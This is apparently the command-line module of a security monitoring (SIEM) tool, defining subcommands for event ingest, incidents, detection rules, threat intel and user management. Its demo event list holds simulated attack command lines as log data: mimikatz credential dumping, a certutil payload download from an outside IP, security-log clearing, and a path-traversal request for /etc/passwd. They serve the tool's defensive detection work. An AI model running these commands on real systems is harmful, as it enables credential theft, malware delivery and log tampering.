from __future__ import annotations

import argparse
import hashlib
import json
import os
import time
from datetime import datetime
from pathlib import Path
from typing import Any

from .pipeline import AutoSIEMPipeline, PipelineResult
from .rbac import ROLE_PERMISSIONS, ROLES, Rbac
from .storage import DEFAULT_DB_PATH, DEFAULT_TENANT, RelationalStorage, open_storage
from .llm import LLMService, config_from_env
from .suppression import DEFAULT_CREATED_BY, VALID_ACTIONS, Suppression, SuppressionEngine
from .coverage import coverage_report
from .metrics import MetricsRegistry, prometheus_text
from .querygen import translate_query, to_cli_flags
from .rag import default_rag_engine
from .rule_assistant import RuleAssistant
from .rules import apply_rule_state, load_rules
from .schemas import DetectionRule
from .sigma import export_rules
from .sigma_sync import DEFAULT_RULESET, RULESETS, default_sigma_dir, load_synced_rules, merge_rules, sync_rules
from .connectors import registry
from .listeners import SyslogServer
from .soar import SoarPlanner
from .threat_intel import ThreatIntelMatcher, default_intel_state, load_intel_state, load_stix_bundle, save_intel_state
from .update_job import run_update
from .distributed import DistributedPipeline, config_from_env as distributed_config_from_env
from .enrichment import enrichment_from_env

DEFAULT_RULE_PATH = Path(__file__).resolve().parents[2] / "rules"
DEFAULT_RBAC_PATH = Path(__file__).resolve().parents[2] / "data" / "rbac_users.json"

DEMO_EVENTS = [
    {"timestamp": "2026-08-04T10:00:00Z", "category": "authentication", "action": "login_success", "user": "alice", "src_ip": "203.0.113.10", "host": "vpn-1", "outcome": "success"},
    {"timestamp": "2026-08-04T10:01:00Z", "category": "email", "action": "phishing_email_received", "user": "alice", "src_ip": "198.51.100.99", "host": "mail-gw", "subject": "Urgent: Your account needs verification", "attachment": "invoice.exe", "outcome": "delivered"},
    {"timestamp": "2026-08-04T10:05:00Z", "category": "authentication", "action": "login_failed", "user": "alice", "src_ip": "198.51.100.25", "host": "vpn-1", "outcome": "failure"},
    {"timestamp": "2026-08-04T10:06:00Z", "category": "process", "action": "process_start", "user": "alice", "host": "workstation-7", "process_name": "powershell.exe", "command_line": "powershell -enc SQBFAFgA", "outcome": "success"},
    {"timestamp": "2026-08-04T10:07:00Z", "category": "process", "action": "process_start", "user": "alice", "host": "workstation-7", "process_name": "mimikatz.exe", "command_line": "mimikatz.exe sekurlsa::logonpasswords", "outcome": "success"},
    {"timestamp": "2026-08-04T10:08:00Z", "category": "cloud", "action": "AssumeRole", "user": "alice", "src_ip": "198.51.100.25", "cloud_account": "prod", "resource": "AdminRole", "outcome": "success"},
    {"timestamp": "2026-08-04T10:09:00Z", "category": "process", "action": "process_start", "user": "alice", "host": "workstation-7", "process_name": "systeminfo.exe", "command_line": "systeminfo", "outcome": "success"},
    {"timestamp": "2026-08-04T10:10:00Z", "category": "process", "action": "process_start", "user": "alice", "host": "workstation-7", "process_name": "svchost.exe", "command_line": "C:\\Users\\alice\\AppData\\Local\\Temp\\svchost.exe -k nsm", "outcome": "success"},
    {"timestamp": "2026-08-04T10:11:00Z", "category": "process", "action": "process_start", "user": "alice", "host": "workstation-7", "process_name": "wevtutil.exe", "command_line": "wevtutil cl security", "outcome": "success"},
    {"timestamp": "2026-08-04T10:12:00Z", "category": "process", "action": "process_start", "user": "alice", "host": "workstation-7", "process_name": "LockBit.exe", "command_line": "LockBit.exe -encrypt C:\\Users\\alice\\Documents\\Q3_report.xlsx", "outcome": "success"},
    {"timestamp": "2026-08-04T10:13:00Z", "category": "process", "action": "process_start", "user": "alice", "host": "workstation-7", "process_name": "cmd.exe", "command_line": "cmd.exe /c certutil -urlcache -split -f http://198.51.100.25/payload.exe C:\\Users\\alice\\AppData\\Local\\Temp\\payload.exe", "outcome": "success"},
    {"timestamp": "2026-08-04T10:14:00Z", "category": "process", "action": "process_start", "user": "alice", "host": "workstation-7", "process_name": "wmic.exe", "command_line": "wmic /node:finance-02 process call create cmd.exe", "outcome": "success"},
    {"timestamp": "2026-08-04T10:15:00Z", "category": "network", "action": "http_request", "user": "alice", "host": "web-01", "src_ip": "198.51.100.55", "dst_ip": "203.0.113.20", "url": "/index.php?page=../../../../etc/passwd", "outcome": "success"},
    {"timestamp": "2026-08-04T10:16:00Z", "category": "process", "action": "process_start", "user": "alice", "host": "workstation-7", "process_name": "ssh.exe", "command_line": "ssh -R 8080:localhost:80 alice@203.0.113.99 -o ServerAliveInterval=30", "outcome": "success"},
    {"timestamp": "2026-08-04T10:17:00Z", "category": "network", "action": "data_transfer", "user": "alice", "host": "workstation-7", "src_ip": "198.51.100.25", "dst_ip": "203.0.113.99", "direction": "outbound", "bytes_sent": 5242880, "protocol": "https", "outcome": "success"},
]


def main() -> None:
    parser = argparse.ArgumentParser(prog="autosiem")
    sub = parser.add_subparsers(dest="command", required=True)

    ingest = sub.add_parser("ingest", help="Process a JSONL event file")
    ingest.add_argument("--file", required=True, help="Path to JSONL events")
    ingest.add_argument("--rules", default=str(DEFAULT_RULE_PATH), help="Rule file or directory")
    _add_llm_arg(ingest)
    _add_storage_args(ingest)

    demo = sub.add_parser("demo", help="Run built-in demo events")
    demo.add_argument("--rules", default=str(DEFAULT_RULE_PATH), help="Rule file or directory")
    _add_llm_arg(demo)
    _add_storage_args(demo)

    incidents = sub.add_parser("incidents", help="List/search persisted incidents")
    _add_db_arg(incidents)
    incidents.add_argument("--limit", type=int, default=50)
    incidents.add_argument("--query", help="Search incident title/severity/data")
    incidents.add_argument("--entity", help="Filter by entity, for example user:alice or ip:198.51.100.25")
    incidents.add_argument("--status", help="Filter by incident status")

    incident = sub.add_parser("incident", help="Show a persisted incident bundle")
    _add_db_arg(incident)
    incident.add_argument("--id", required=True, help="Incident ID")

    timeline = sub.add_parser("timeline", help="Show a chronological incident timeline")
    _add_db_arg(timeline)
    timeline.add_argument("--id", required=True, help="Incident ID")

    events = sub.add_parser("events", help="List/search persisted normalized events")
    _add_db_arg(events)
    events.add_argument("--limit", type=int, default=100)
    events.add_argument("--query", help="Search event fields and JSON data")
    events.add_argument("--entity", help="Filter by entity, for example user:alice, host:vpn-1, or ip:198.51.100.25")

    findings = sub.add_parser("findings", help="List persisted findings")
    _add_db_arg(findings)
    findings.add_argument("--limit", type=int, default=100)

    approve = sub.add_parser("approve", help="Approve an AI action proposal")
    _add_db_arg(approve)
    approve.add_argument("--proposal-id", required=True)
    approve.add_argument("--actor", default="analyst")

    reject = sub.add_parser("reject", help="Reject an AI action proposal")
    _add_db_arg(reject)
    reject.add_argument("--proposal-id", required=True)
    reject.add_argument("--actor", default="analyst")

    audit = sub.add_parser("audit", help="List audit log entries")
    _add_db_arg(audit)
    audit.add_argument("--limit", type=int, default=100)

    suppressions = sub.add_parser("suppressions", help="List suppression/exception rules")
    _add_db_arg(suppressions)
    suppressions.add_argument("--limit", type=int, default=50)

    suppress_add = sub.add_parser("suppression-add", help="Add a suppression/exception rule")
    _add_db_arg(suppress_add)
    suppress_add.add_argument("--rule-id", required=True, help="Rule ID, or '*' to match any rule")
    suppress_add.add_argument("--name", required=True)
    suppress_add.add_argument("--action", required=True, choices=sorted(VALID_ACTIONS))
    suppress_add.add_argument("--reason", required=True)
    suppress_add.add_argument("--entity", help="Scope to an entity, e.g. user:alice, host:vpn-1, ip:...")
    suppress_add.add_argument("--downgrade-to", help="Severity name (low/medium/high) when action=downgrade")
    suppress_add.add_argument("--expires-at", help="ISO timestamp after which the rule is ignored")
    suppress_add.add_argument("--created-by", default=DEFAULT_CREATED_BY)

    suppress_del = sub.add_parser("suppression-delete", help="Delete a suppression/exception rule")
    _add_db_arg(suppress_del)
    suppress_del.add_argument("--id", required=True)

    incident_update = sub.add_parser("incident-update", help="Update incident triage fields (status/assignee/resolution/note)")
    _add_db_arg(incident_update)
    incident_update.add_argument("--id", required=True)
    incident_update.add_argument("--status", choices=["open", "investigating", "resolved", "closed"])
    incident_update.add_argument("--assignee")
    incident_update.add_argument("--resolution")
    incident_update.add_argument("--note", help="Attach a comment")
    incident_update.add_argument("--actor", default="analyst")

    incident_comments = sub.add_parser("incident-comments", help="List incident comments")
    _add_db_arg(incident_comments)
    incident_comments.add_argument("--id", required=True)

    incident_comment = sub.add_parser("incident-comment", help="Add an incident comment")
    _add_db_arg(incident_comment)
    incident_comment.add_argument("--id", required=True)
    incident_comment.add_argument("--body", required=True)
    incident_comment.add_argument("--actor", default="analyst")

    coverage = sub.add_parser("coverage", help="Report MITRE ATT&CK coverage across detection rules")
    _add_db_arg(coverage)
    coverage.add_argument("--rules", default=str(DEFAULT_RULE_PATH), help="Rule file or directory")

    export = sub.add_parser("export", help="Export detection rules as Sigma YAML")
    _add_db_arg(export)
    export.add_argument("--rules", default=str(DEFAULT_RULE_PATH), help="Rule file or directory")
    export.add_argument("--out-dir", required=True, help="Directory to write Sigma YAML files into")

    listen = sub.add_parser("listen", help="Run the Syslog (RFC 5424/3164) + CEF UDP listener")
    listen.add_argument("--host", default="127.0.0.1")
    listen.add_argument("--port", type=int, default=5514, help="UDP port (default 5514; use 514 with sudo)")
    listen.add_argument("--rules", default=str(DEFAULT_RULE_PATH), help="Rule file or directory")
    _add_llm_arg(listen)
    _add_storage_args(listen)

    poll = sub.add_parser("poll", help="Poll a connector and process new events")
    poll.add_argument("--connector", default="file", help=f"Connector name, one of: {', '.join(registry.names())}")
    poll.add_argument("--path", help="Connector path (a .jsonl file or a directory of .jsonl files); file-based connectors only")
    poll.add_argument("--url", help="Org/API base URL for API-native connectors, e.g. https://dev-123.okta.com")
    poll.add_argument("--org", help="Organization login for org-scoped connectors, e.g. github-api")
    poll.add_argument(
        "--token-env",
        help="Environment variable holding the API token (default: the connector's own, AUTOSIEM_OKTA_TOKEN or AUTOSIEM_GITHUB_TOKEN). The token is never taken as an argument so it stays out of shell history and the process list.",
    )
    poll.add_argument("--state", help="Where to persist the API pagination cursor (default: alongside --db)")
    poll.add_argument("--since", help="ISO timestamp for the first API poll (default: 24h ago)")
    poll.add_argument("--limit", type=int, help="API page size")
    poll.add_argument("--max-pages", type=int, help="Maximum API pages to follow in one poll")
    poll.add_argument("--rules", default=str(DEFAULT_RULE_PATH), help="Rule file or directory")
    _add_llm_arg(poll)
    _add_storage_args(poll)

    connectors = sub.add_parser("connectors", help="List registered connectors")
    _add_db_arg(connectors)

    load_intel = sub.add_parser("load-intel", help="Load a STIX/TAXII threat-intel bundle into the intel state")
    _add_db_arg(load_intel)
    load_intel.add_argument("--file", required=True, help="Path to a STIX 2.x bundle JSON file")

    intel = sub.add_parser("intel", help="List loaded threat-intel indicators")
    _add_db_arg(intel)
    intel.add_argument("--limit", type=int, default=50)

    sources = sub.add_parser("sources", help="Per-source ingest health")
    _add_db_arg(sources)

    rules = sub.add_parser("rules", help="List detection rules with persisted enable/disable state")
    _add_db_arg(rules)
    rules.add_argument("--rules", default=str(DEFAULT_RULE_PATH), help="Rule file or directory")
    rules.add_argument("--rule-id", help="Show a single rule")
    rules.add_argument("--enable", metavar="RULE_ID", help="Persist an enabled override for a rule")
    rules.add_argument("--disable", metavar="RULE_ID", help="Persist a disabled override for a rule")
    rules.add_argument("--status", choices=["enabled", "disabled"], help="Filter rules by effective state")

    rule_new = sub.add_parser("rule-new", help="Draft a detection rule from a plain-English description")
    rule_new.add_argument("--description", required=True, help="Detection need in plain English")
    rule_new.add_argument("--techniques", nargs="*", default=[], help="MITRE ATT&CK technique codes, e.g. T1059.001")
    rule_new.add_argument("--out-dir", default=str(DEFAULT_RULE_PATH), help="Where to write the rule file")
    rule_new.add_argument("--test-cases", action="store_true", help="Also print generated test cases")
    _add_db_arg(rule_new)

    search_nl = sub.add_parser("search-nl", help="Natural-language search over incidents or events")
    search_nl.add_argument("query", help='e.g. "failed logins by alice last 24h"')
    search_nl.add_argument("--target", choices=["incidents", "events"], default="incidents")
    _add_db_arg(search_nl)

    update = sub.add_parser("update", help="Run one rule/intel update cycle")
    update.add_argument("--rules", default=str(DEFAULT_RULE_PATH), help="Rule file or directory")
    update.add_argument("--intel-url", help="STIX bundle URL to refresh threat intel from")
    update.add_argument("--intel-path", help="Local STIX bundle file to refresh threat intel from")
    update.add_argument(
        "--refresh-attack",
        action="store_true",
        help="Fetch MITRE's published ATT&CK Enterprise release and refresh the local matrix index (network)",
    )
    update.add_argument("--attack-version", help="Pin an ATT&CK version instead of tracking the newest")
    update.add_argument(
        "--attack-index",
        help="Where the refreshed ATT&CK index lives (default: <db>.attack.json)",
    )
    update.add_argument(
        "--refresh-kev",
        action="store_true",
        help="Fetch CISA's known-exploited-vulnerabilities catalogue for vulnerability enrichment (network)",
    )
    update.add_argument("--kev-file", help="Where the KEV cache lives (default: <db>.kev.json)")
    _add_db_arg(update)

    sigma_sync = sub.add_parser("sigma-sync", help="Sync runnable detection rules from the SigmaHQ community ruleset")
    _add_db_arg(sigma_sync)
    sigma_sync.add_argument("--ruleset", default=DEFAULT_RULESET, choices=list(RULESETS), help="Which published SigmaHQ bundle to pull")
    sigma_sync.add_argument("--dest", help="Where synced rules are written (default: <db>.sigma/)")
    sigma_sync.add_argument("--limit", type=int, help="Cap how many rules are written (the report still counts them all)")

    metrics = sub.add_parser("metrics", help="Export Prometheus-format metrics")
    _add_db_arg(metrics)

    audit_verify = sub.add_parser("audit-verify", help="Verify the audit log hash chain")
    _add_db_arg(audit_verify)

    distributed = sub.add_parser("distributed", help="Show distributed pipeline configuration and queue/archive state")
    _add_db_arg(distributed)
    distributed.add_argument("--rules", default=str(DEFAULT_RULE_PATH), help="Rule file or directory")
    distributed.add_argument("--replay", action="store_true", help="Replay unacked messages from the durable queue")

    users = sub.add_parser("users", help="Manage RBAC users (multi-tenant roles) or describe roles")
    _add_db_arg(users)
    users.add_argument("action", choices=["list", "add", "remove", "rotate", "revoke", "roles"], help="list users, add/remove/rotate/revoke a user, or describe roles")
    users.add_argument(
        "--file",
        default=os.environ.get("AUTOSIEM_RBAC_FILE", str(DEFAULT_RBAC_PATH)),
        help="RBAC users JSON file (default: AUTOSIEM_RBAC_FILE or data/rbac_users.json)",
    )
    users.add_argument("--name", help="User name (add/remove)")
    users.add_argument("--role", default="viewer", help=f"Role, one of: {', '.join(ROLES)}")
    users.add_argument("--tenant", default="default", help="Tenant label")
    users.add_argument("--token", help="API token to assign (stored as a sha256 hash)")

    sub.add_parser("migrate", help="Explicitly apply PostgreSQL forward migrations")
    outbox = sub.add_parser("outbox", help="PostgreSQL projection backlog or bounded delivery")
    outbox.add_argument("--deliver", action="store_true",
                        help="Deliver pending records to the configured projection before reporting")
    outbox.add_argument("--limit", type=int, default=100,
                        help="Maximum records to deliver in one pass, 1-1000 (default: 100)")

    args = parser.parse_args()
    if args.command in {"migrate", "outbox"}:
        try:
            _run_postgres_command(args)
        except (ValueError, RuntimeError) as exc:
            # postgres.py and projections.py raise curated, credential-free
            # messages. A missing DSN or extra is operator configuration, not
            # a crash, so report it the way an unconfigured LLM backend is.
            raise SystemExit(str(exc)) from None
        return

    if args.command in {"ingest", "demo", "poll"}:
        store = None if args.no_save else open_storage(args.db)
        engine = load_suppression_engine(store) if store else None
        result = _run_pipeline_command(args, suppression_engine=engine, store=store)
        _print_pipeline_result(result, saved=store is not None, db=args.db)
        return

    if args.command == "listen":
        _run_listener(args)
        return

    store = open_storage(args.db)
    if args.command == "sources":
        _print_json(store.source_stats())
    elif args.command == "connectors":
        _print_json({"connectors": registry.names()})
    elif args.command == "load-intel":
        indicators = load_stix_bundle(args.file)
        state_path = default_intel_state(args.db)
        existing = load_intel_state(state_path)
        merged = existing + [i for i in indicators if i.indicator_id not in {e.indicator_id for e in existing}]
        save_intel_state(state_path, merged)
        _print_json({"loaded": len(indicators), "total": len(merged), "state": str(state_path)})
    elif args.command == "intel":
        indicators = load_intel_state(default_intel_state(args.db))
        _print_json({"indicators": [i.to_dict() for i in indicators[: args.limit]], "total": len(indicators)})
    elif args.command == "incidents":
        if args.query or args.entity or args.status:
            _print_json(store.search_incidents(query=args.query, entity=args.entity, status=args.status, limit=args.limit))
        else:
            _print_json(store.list_incidents(limit=args.limit))
    elif args.command == "incident":
        bundle = store.get_incident_bundle(args.id)
        _print_json(bundle or {"error": "incident_not_found", "incident_id": args.id})
    elif args.command == "timeline":
        timeline = store.incident_timeline(args.id)
        _print_json(timeline if timeline is not None else {"error": "incident_not_found", "incident_id": args.id})
    elif args.command == "events":
        if args.query or args.entity:
            _print_json(store.search_events(query=args.query, entity=args.entity, limit=args.limit))
        else:
            _print_json(store.list_events(limit=args.limit))
    elif args.command == "findings":
        _print_json(store.list_findings(limit=args.limit))
    elif args.command == "approve":
        _print_json(store.decide_proposal(args.proposal_id, "approved", actor=args.actor) or {"error": "proposal_not_found", "proposal_id": args.proposal_id})
    elif args.command == "reject":
        _print_json(store.decide_proposal(args.proposal_id, "rejected", actor=args.actor) or {"error": "proposal_not_found", "proposal_id": args.proposal_id})
    elif args.command == "audit":
        _print_json(store.list_audit(limit=args.limit))
    elif args.command == "suppressions":
        _print_json(store.list_suppressions())
    elif args.command == "suppression-add":
        _print_json(
            store.add_suppression(
                rule_id=args.rule_id,
                name=args.name,
                action=args.action,
                reason=args.reason,
                entity=args.entity,
                downgrade_to=args.downgrade_to,
                expires_at=args.expires_at,
                created_by=args.created_by,
            )
        )
    elif args.command == "suppression-delete":
        _print_json({"deleted": store.delete_suppression(args.id), "suppression_id": args.id})
    elif args.command == "incident-update":
        updated = store.update_incident(
            args.id, status=args.status, assignee=args.assignee, resolution=args.resolution, note=args.note, actor=args.actor
        )
        _print_json(updated or {"error": "incident_not_found", "incident_id": args.id})
    elif args.command == "incident-comments":
        _print_json(store.list_incident_comments(args.id))
    elif args.command == "incident-comment":
        comment = store.add_incident_comment(args.id, args.actor, args.body)
        _print_json(comment or {"error": "incident_not_found", "incident_id": args.id})
    elif args.command == "coverage":
        _print_json(coverage_report(_all_rules(args.rules)))
    elif args.command == "rules":
        if args.enable:
            _print_json(store.set_rule_enabled(args.enable, True, actor="cli"))
        elif args.disable:
            _print_json(store.set_rule_enabled(args.disable, False, actor="cli"))
        else:
            rules_list = _rules_with_state(args.rules, store.rule_state_dict())
            selected = [rule for rule in rules_list if not args.rule_id or rule.rule_id == args.rule_id]
            if args.status == "enabled":
                selected = [rule for rule in selected if rule.enabled]
            elif args.status == "disabled":
                selected = [rule for rule in selected if not rule.enabled]
            if args.rule_id and not selected:
                _print_json({"error": "rule_not_found", "rule_id": args.rule_id})
            else:
                _print_json({"rules": [_rule_to_dict(rule) for rule in selected], "total": len(selected), "overrides": store.list_rule_states()})
    elif args.command == "rule-new":
        assistant = RuleAssistant()
        suggestion = assistant.draft_from_text(args.description, args.techniques)
        path = assistant.write_rule_file(suggestion.rule, args.out_dir)
        with store.connect() as conn:
            store.audit(conn, actor="cli", action="rule_created", target=path.name, details={"rule_id": suggestion.rule["id"], "out_dir": args.out_dir})
        payload: dict[str, Any] = {
            "rule": suggestion.rule,
            "suggestion": suggestion.to_dict()["suggestion"],
            "path": str(path),
        }
        if getattr(args, "test_cases", False):
            payload["test_cases"] = assistant.generate_test_cases(suggestion.rule)
        _print_json(payload)
    elif args.command == "search-nl":
        dsl = translate_query(args.query)
        limit = dsl.get("limit") or 50
        if args.target == "events":
            rows = store.search_events(query=dsl.get("query"), entity=dsl.get("entity"), limit=limit)
        else:
            rows = store.search_incidents(query=dsl.get("query"), entity=dsl.get("entity"), status=dsl.get("status"), limit=limit)
        _print_json({"translation": dsl, "cli": to_cli_flags(dsl), "target": args.target, "results": rows, "total": len(rows)})
    elif args.command == "update":
        report = run_update(
            rules_dir=args.rules,
            db_path=args.db,
            intel_url=args.intel_url,
            intel_path=args.intel_path,
            attack_index_path=args.attack_index,
            refresh_attack=args.refresh_attack,
            attack_version=args.attack_version,
            kev_path=args.kev_file,
            refresh_kev_catalog=args.refresh_kev,
        )
        _print_json({
            "rules_loaded": report.rules_loaded,
            "unique_techniques": report.coverage.get("unique_techniques", 0),
            "watchlist_gap_count": report.coverage.get("watchlist_gap_count", 0),
            "watchlist_size": report.coverage.get("baseline", {}).get("technique_count", 0),
            "attack_version": report.attack_version,
            "attack_latest": report.attack_latest or None,
            "attack_refreshed": report.attack_refreshed,
            "kev_version": report.kev_version or None,
            "kev_refreshed": report.kev_refreshed,
            "matrix_technique_percent": report.coverage.get("matrix", {}).get("technique_percent"),
            "intel_refreshed": report.intel_refreshed,
            "messages": report.messages,
        })
    elif args.command == "sigma-sync":
        dest = args.dest or default_sigma_dir(args.db)
        report = sync_rules(dest, ruleset=args.ruleset, limit=args.limit)
        _print_json({
            "release": report.release,
            "ruleset": report.ruleset,
            "candidates": report.candidates,
            "imported": report.imported,
            "not_applicable": report.not_applicable,
            "unsupported_syntax": report.unsupported_syntax,
            "techniques": len(report.techniques),
            "missing_fields": report.missing_fields,
            "destination": report.destination,
            "summary": report.summary(),
            "next_step": f"export AUTOSIEM_SIGMA_DIR={report.destination}",
        })
    elif args.command == "metrics":
        # Local MetricsRegistry — do NOT shadow the module-level connectors `registry`
        # import, or every subcommand breaks with UnboundLocalError.
        metric_registry = MetricsRegistry()
        for key, value in store.counts().items():
            metric_registry.gauge(f"autosiem_{key}").set(value)
        print(prometheus_text(metric_registry), end="")
    elif args.command == "audit-verify":
        mismatches = store.verify_audit_chain()
        _print_json({"intact": not mismatches, "entries": len(store.list_audit(limit=100000)), "mismatches": mismatches})
    elif args.command == "distributed":
        _run_distributed(args)
    elif args.command == "users":
        _run_users(args)
    elif args.command == "export":
        exported = export_rules(load_rules(args.rules), args.out_dir)
        _print_json({"exported": len(exported), "files": [str(p) for p in exported]})


def _add_db_arg(parser: argparse.ArgumentParser) -> None:
    parser.add_argument("--db", default=str(DEFAULT_DB_PATH), help="SQLite database path")


def _run_distributed(args: argparse.Namespace) -> None:
    """Report which distributed components are enabled, and their state."""
    config = distributed_config_from_env()
    # AUTOSIEM_WORKERS defaults to 4, so the worker pool is never a signal that
    # anything was configured. It also does not apply on the CLI path, which
    # always hands DistributedPipeline a fully configured pipeline.
    enabled = {
        "queue": config.queue_enabled,
        "archive": config.archive_enabled,
        "alternate_backend": config.alternate_backend,
    }
    payload: dict[str, Any] = {
        "enabled": enabled,
        "any_enabled": any(enabled.values()),
        "config": {
            "queue_path": config.queue_path,
            "queue_max_pending": config.queue_max_pending,
            "archive_path": config.archive_path,
            "workers": config.workers,
            "backend_type": config.backend_type,
            "backend_url": config.backend_url or None,
        },
        "notes": [
            "Alternate backends store events only; findings, incidents, "
            "investigations and the audit chain stay in the configured authority. "
            "PostgreSQL delivers projections through the outbox command.",
            "AUTOSIEM_WORKERS applies only to library use of DistributedPipeline "
            "without an injected pipeline. CLI ingest and listen always inject "
            "the configured pipeline so suppressions, threat intel, RAG, SOAR "
            "and the behavioral baseline are applied.",
        ],
    }
    if any(enabled.values()):
        rules = _rules_with_state(args.rules, _rule_state_from_db(args.db))
        store = open_storage(args.db) if args.replay else None
        configured = None
        if store is not None:
            configured = AutoSIEMPipeline(
                rules, suppression_engine=load_suppression_engine(store),
                threat_intel=_make_threat_intel(args), rag=default_rag_engine(store, tenant_id=DEFAULT_TENANT),
                soar=SoarPlanner(), event_search=store, baseline_store=store, tenant_id=DEFAULT_TENANT,
                enrichment=enrichment_from_env(indicators=load_intel_state(default_intel_state(args.db))),
            )
        pipeline = DistributedPipeline(
            config, rules, db_path=str(args.db), pipeline=configured,
            persist=store.save_pipeline_result if store else None,
            transactional_outbox=os.environ.get("AUTOSIEM_STORAGE", "sqlite").lower() == "postgres",
        )
        if args.replay:
            payload["replay"] = pipeline.replay_from_queue()
        # Report stats after any replay so the numbers reflect the final state.
        payload["stats"] = pipeline.stats
    _print_json(payload)


def _run_users(args: argparse.Namespace) -> None:
    """Manage the RBAC user store (list/add/remove/rotate/revoke) or describe role permissions."""
    rbac = Rbac.load(args.file)
    if args.action == "roles":
        _print_json({"roles": {role: sorted(perms) for role, perms in ROLE_PERMISSIONS.items()}})
        return
    if args.action == "list":
        _print_json({"users": rbac.list_users(), "enabled": rbac.is_enabled(), "file": args.file})
        return
    if args.action == "add":
        if not args.name:
            _print_json({"error": "name_required"})
            return
        try:
            user = rbac.add_user(args.name, role=args.role, tenant=args.tenant, token=args.token)
        except ValueError as exc:
            _print_json({"error": str(exc)})
            return
        rbac.save(args.file)
        store = open_storage(args.db)
        with store.connect() as conn:
            store.audit(conn, actor="cli", action="rbac_user_added", target=args.name, details={"role": user.role, "tenant": user.tenant})
        _print_json({"added": user.name, "role": user.role, "tenant": user.tenant, "token_hashed": bool(args.token), "file": args.file})
        return
    if args.action == "remove":
        removed = rbac.remove_user(args.name)
        rbac.save(args.file)
        store = open_storage(args.db)
        with store.connect() as conn:
            store.audit(conn, actor="cli", action="rbac_user_removed", target=args.name, details={})
        _print_json({"removed": removed, "name": args.name, "file": args.file})
        return
    if args.action == "rotate":
        if not args.name:
            _print_json({"error": "name_required"})
            return
        try:
            new_token = rbac.rotate_token(args.name, new_token=args.token)
        except ValueError as exc:
            _print_json({"error": str(exc)})
            return
        rbac.save(args.file)
        store = open_storage(args.db)
        with store.connect() as conn:
            store.audit(conn, actor="cli", action="rbac_token_rotated", target=args.name, details={})
        _print_json({"name": args.name, "new_token": new_token, "file": args.file})
        return
    if args.action == "revoke":
        if not args.name:
            _print_json({"error": "name_required"})
            return
        revoked = rbac.revoke_token(args.name)
        rbac.save(args.file)
        store = open_storage(args.db)
        with store.connect() as conn:
            store.audit(conn, actor="cli", action="rbac_token_revoked", target=args.name, details={})
        _print_json({"revoked": revoked, "name": args.name, "file": args.file})


def _add_llm_arg(parser: argparse.ArgumentParser) -> None:
    parser.add_argument("--llm", action="store_true", help="Enable LLM using AUTOSIEM_LLM_* environment settings")


def _make_llm(enable: bool) -> LLMService | None:
    if not enable:
        return None
    service = LLMService(config=config_from_env())
    if not service.enabled:
        raise SystemExit(
            "No LLM backend configured. Set AUTOSIEM_LLM_URL (any OpenAI-compatible server: "
            "LM Studio, Ollama, vLLM, OpenAI, ...) with optional AUTOSIEM_LLM_API_KEY and "
            "AUTOSIEM_LLM_MODEL, or set AUTOSIEM_LLM_BACKEND=ollama, or drop --llm."
        )
    return service


def _add_storage_args(parser: argparse.ArgumentParser) -> None:
    _add_db_arg(parser)
    parser.add_argument("--no-save", action="store_true", help="Do not persist pipeline output to the configured store")


def _run_pipeline_command(args: argparse.Namespace, suppression_engine: SuppressionEngine | None = None, store: RelationalStorage | None = None) -> PipelineResult:
    def finish(result: PipelineResult) -> PipelineResult:
        if store is not None:
            store.save_pipeline_result(result)
        return result

    llm = _make_llm(getattr(args, "llm", False))
    threat_intel = _make_threat_intel(args)
    rules = _rules_with_state(args.rules, _rule_state_from_db(args.db))
    searcher = _event_search_from_db(args.db)
    # Past incidents join the runbooks in the RAG index when a store exists.
    ragger, soarer = default_rag_engine(searcher, tenant_id=DEFAULT_TENANT), SoarPlanner()
    # Threat-intel indicators double as an enrichment source.
    enricher = enrichment_from_env(indicators=load_intel_state(default_intel_state(args.db)))

    # Check for distributed mode via environment variables
    dist_config = distributed_config_from_env()
    
    if args.command == "ingest":
        lines = Path(args.file).read_text(encoding="utf-8").splitlines()
        pipeline = AutoSIEMPipeline(rules, llm=llm, suppression_engine=suppression_engine, threat_intel=threat_intel, rag=ragger, soar=soarer, event_search=searcher, tenant_id=DEFAULT_TENANT, baseline_store=searcher, enrichment=enricher)
        # When distributed components are configured, they wrap this one
        # pipeline (archive -> queue -> process -> backend -> ack). Running the
        # standard pipeline as well would process every event twice.
        if dist_config.queue_enabled or dist_config.archive_enabled or dist_config.alternate_backend:
            return DistributedPipeline(dist_config, rules, db_path=str(args.db), pipeline=pipeline, persist=store.save_pipeline_result if store else None, transactional_outbox=os.environ.get("AUTOSIEM_STORAGE", "sqlite").lower() == "postgres").run(lines)
        return finish(pipeline.process_lines(lines))
    if args.command == "poll":
        connector = registry.create(args.connector, _connector_config(args))
        events = connector.poll()
        health = connector.health()
        if not health.ok:
            print(json.dumps({"connector": args.connector, "error": health.detail}, indent=2))
        lines = [json.dumps(event) for event in events]
        pipeline = AutoSIEMPipeline(rules, llm=llm, suppression_engine=suppression_engine, threat_intel=threat_intel, rag=ragger, soar=soarer, event_search=searcher, tenant_id=DEFAULT_TENANT, baseline_store=searcher, enrichment=enricher)
        return finish(pipeline.process_lines(lines))
    # `demo` deliberately does NOT persist the behavioral baseline. Its events
    # carry fixed timestamps, so replaying them stacks several events onto the
    # same instant and trips the burst signal on every re-run. Real ingest paths
    # advance in time and do keep a warm baseline.
    lines = [json.dumps(event) for event in DEMO_EVENTS]
    return finish(AutoSIEMPipeline(rules, llm=llm, suppression_engine=suppression_engine, threat_intel=threat_intel, rag=ragger, soar=soarer, event_search=searcher, tenant_id=DEFAULT_TENANT, enrichment=enricher).process_lines(lines))


def _make_threat_intel(args: argparse.Namespace) -> ThreatIntelMatcher | None:
    indicators = load_intel_state(default_intel_state(args.db))
    return ThreatIntelMatcher(indicators) if indicators else None


def _all_rules(rules_dir: str | Path) -> list[DetectionRule]:
    """Curated rules plus any synced from SigmaHQ.

    Curated rules win on a rule_id collision, so third-party content never
    silently replaces one this project authored and tested. Load failures in
    synced content are printed rather than swallowed: a broken sync must not
    look like a small one.
    """
    rules = load_rules(rules_dir)
    sigma_dir = os.environ.get("AUTOSIEM_SIGMA_DIR")
    if not sigma_dir:
        return rules
    errors: list[str] = []
    synced = load_synced_rules(sigma_dir, errors=errors)
    for problem in errors[:5]:
        print(f"warning: skipped synced rule {problem}")
    if len(errors) > 5:
        print(f"warning: {len(errors) - 5} further synced rules could not be loaded")
    return merge_rules(rules, synced)


def _rules_with_state(rules_dir: str | Path, state: dict[str, bool]) -> list[DetectionRule]:
    """Load rules fresh and overlay any persisted enable/disable overrides."""
    rules = _all_rules(rules_dir)
    if state:
        rules = apply_rule_state(rules, state)
    return rules


def _connector_config(args: argparse.Namespace) -> dict[str, Any]:
